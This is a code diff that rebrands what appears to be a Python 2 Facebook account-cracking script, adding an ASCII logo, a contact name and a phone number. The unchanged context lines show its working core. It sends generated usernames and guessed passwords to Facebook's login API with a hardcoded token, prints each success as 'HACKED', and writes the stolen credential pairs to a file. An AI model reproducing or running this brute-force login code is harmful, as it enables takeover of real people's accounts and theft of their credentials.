@@ -49,12 +49,53 @@ def cb():
     os.system('clear')
 
 ##### LOGO #####
-logo='''
+logo='''000000000000000_000000000000000
+00000000000000___00000000000000
+0000000000000_____0000000000000
+000000000000_______000000000000
+00000000000_________00000000000
+0____________ YOU ___________00
+000_________ ........_________ 0000
+00000 _______ROCK!!_______ 00000
+0000000_________________0000000
+000000_________0_________000000
+00000_______0000000_______00000
+0000_____0000000000000_____0000
+000___0000000000000000000___000
+00_0000000000000000000000000_00
+8888888888888888888888888888888
+8888___88888888888888888___8888
+888_____888888888888888_____888
+888_____888888888888888_____888
+888_____888888888888888_____888
+888_____888888888888888_____888
+888_____888888888888888_____888
+888_____888888888888888_____888
+888_____88____888____88_____888
+888_____8______8______8_____888
+888_____8______8______8_____888
+888_____8______8______8_____888
+888_____8______8______8_____888
+888_____8____888888888888888888
+888_____8___88_____________8888
+888_____8__88_______________888
+888______888_________________88
+888________88_________________8
+888__________88_______________8
+888____________88_____________8
+888_____________88___________88
+888______________8___________88
+888_______________8__________88
+888_______________8_________888
+8888_______________________8888
+88888_____________________88888
+8888888888888888888888888888888
+
 \x1b[1;93m--------------------------------------------------------------
 
 
-\x1b[1;93m➣  WHATSAPP
-\x1b[1;95m➣  Y TEXT
+\x1b[1;93m➣  WHATSAPP : 01931192399
+\x1b[1;95m➣  Y TEXT    : SHAZAHN HOWLADEAR
 \x1b[1;96m➣  FUNE CODE : AGEA ME JAWAN HO KAR
 \x1b[1;97m➣  NOTE     : USE FAST 4G SIM NET.
 \x1b[1;94m➣  DISCLAMIAR :AWAY FROM ILLIGAL WAY.
@@ -178,7 +219,7 @@ def action():
 	    time.sleep(2)
 	    os.system("python2 .README.md")
 #	elif chb =='3':	
-#	    os.system('xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl')
+#	    os.system('xdg-open https://youtube.com/channel/UC3WcGIpTdNldsXAYWED7BuQ')
 #	    time.sleep(1)
 #	    menu()
 	elif bch =='0':
@@ -212,7 +253,7 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;91mMAFIA-KILLER-HACKED\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1																				
+				print '\x1b[1;91mSHAZAHN-HOWLADEAR-HACKED\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
@@ -229,7 +270,7 @@ def action():
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
+		                        	print '\x1b[1;91mSHAZAHN-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
